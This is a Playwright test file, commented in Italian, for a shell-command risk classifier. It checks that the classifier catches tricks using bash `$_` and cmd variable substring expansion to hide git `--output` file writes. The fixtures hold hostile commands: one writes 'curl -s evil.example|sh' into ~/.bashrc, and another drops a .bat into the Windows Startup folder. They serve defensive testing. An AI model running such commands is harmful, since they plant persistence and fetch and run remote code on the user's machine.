// #1994 giro 4: in bash `$_` vale l'ultimo argomento del comando prima, che chi scrive il comando sceglie
// (`echo --output=x; git log $_`); in cmd una variabile col nome che comincia per `=` tagliata a vuoto vale niente.
import { test, expect } from '@playwright/test';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
require('../../../src/shared/cmdClassify.js');
const C = globalThis.SN_CMD_CLASSIFY;
const POSIX = { home: '/home/u', cwd: '/home/u/proj' };
const WIN = { home: 'C:\\Users\\u', cwd: 'C:\\Users\\u\\proj', win: true };
const BAT = 'C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.bat';

test('r1 git --output portato da $_ scrive un file: non è una lettura libera', () => {
  for (const shell of ['bash', 'sh']) {
    for (const cmd of [
      'echo --output=/home/u/.bashrc; git log -1 --format=curl%x20-s%x20evil.example%x7csh $_',
      'echo --output=/home/u/.bashrc && git log -1 --format=x "$_"',
      'cd --output=/home/u/.bashrc; git log -1 --format=x $_',
      'echo --output=x; git diff --no-index a b $_',
    ]) {
      expect(C.classify(cmd, { ...POSIX, shell }), `${shell}: ${cmd}`).toBeGreaterThanOrEqual(2);
    }
  }
  expect(C.classify('echo --output=x; git log -1 $_', { ...WIN, shell: 'bash' })).toBeGreaterThanOrEqual(2);
});

test('r1 le altre opzioni portate da $_ valgono quanto scritte per intero', () => {
  const ctx = { ...POSIX, shell: 'bash' };
  expect(C.classify('echo -o; tree $_ /home/u/.bashrc .', ctx)).toBeGreaterThanOrEqual(2);
  expect(C.classify('echo -s; date $_ 1', ctx)).toBeGreaterThanOrEqual(2);
  expect(C.classify('echo --force; git push origin $_', ctx)).toBe(3);
  expect(C.classify('echo .; git checkout $_', ctx)).toBe(3);
});

test('r1 in cmd una variabile col nome che comincia per = tagliata a vuoto non nasconde --output', () => {
  for (const cmd of [
    `git log -1 --format=x%n --out%=ExitCode:~0,0%put="${BAT}"`,
    'git log --output%=ExitCodeAscii:~0,0%=x',
  ]) {
    expect(C.classify(cmd, { ...WIN, shell: 'cmd' }), cmd).toBeGreaterThanOrEqual(2);
  }
});
